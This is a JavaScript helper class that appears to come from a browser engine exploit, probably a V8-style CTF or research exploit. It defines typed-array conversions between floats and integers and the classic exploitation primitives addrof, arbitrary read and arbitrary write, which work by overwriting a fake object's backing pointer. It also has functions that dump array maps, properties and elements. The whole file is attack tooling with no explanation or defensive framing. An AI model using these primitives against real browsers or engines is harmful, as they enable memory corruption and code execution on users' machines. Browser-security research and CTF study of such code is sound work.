class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
    }
    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }
    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }
    ftoll(f) {
        this.f64[0] = f;
        return this.u64[0];
    }
    lltof(f) {
        this.u64[0] = f;
        return this.f64[0];
    }
    hex(val) {
        return '0x' + val.toString(16).padStart(16, '0');
    }
    addrof(object) {
        this.pointer_array[0] = object;
        this.fake_obj[2] = this.lltof(this.pointer_array_buffer_addr);
        return this.ftoll(this.target_array[0]);
    }
    arbread(addr) {
        this.fake_obj[2] = this.lltof(addr - 0x10n + 1n);
        var val = this.ftoll(this.target_array[0]);
        console.log("[+] read > " + this.hex(addr) + " = " + this.hex(val));
        return val;
    }
    arbwrite(addr, data) {
        this.fake_obj[2] = this.lltof(addr - 0x10n + 1n);
        this.target_array[0] = this.lltof(data);
        console.log("[*] write > " + this.hex(addr) + " = " + this.hex(data));
        return;
    }
    pad(num, len) {
        return num.toString().padStart(len, ' ');
    }
    put_array_info(name, arr, offset) {
        console.log("==================================================");
        console.log("[+] " + name + " map: " + this.hex(this.ftoll(arr[offset])));
        console.log("[+] " + name + " property: " + this.hex(this.ftoll(arr[offset + 1])));
        console.log("[+] " + name + " element: " + this.hex(this.ftoll(arr[offset + 2])));
        console.log("[+] " + name + " length: " + this.hex(this.ftoih(arr[offset + 3])));
        console.log("==================================================");
    }
    put_array_buffer(name, arr, offset) {
        console.log("==================================================");
        var len = this.ftoih(arr[offset + 1])
        console.log("[+] " + name + " map: " + this.hex(this.ftoll(arr[offset])));
        console.log("[+] " + name + " length: " + this.hex(this.ftoih(arr[offset + 1])));
        console.log("[+] " + name + " elements: ");
        for (var i = 0; i < len; i++) {
            console.log("    [" + this.pad(i, 2) + "]: " + this.hex(this.ftoll(arr[offset + 2 + i])));
        }
        console.log("==================================================");
    }
}

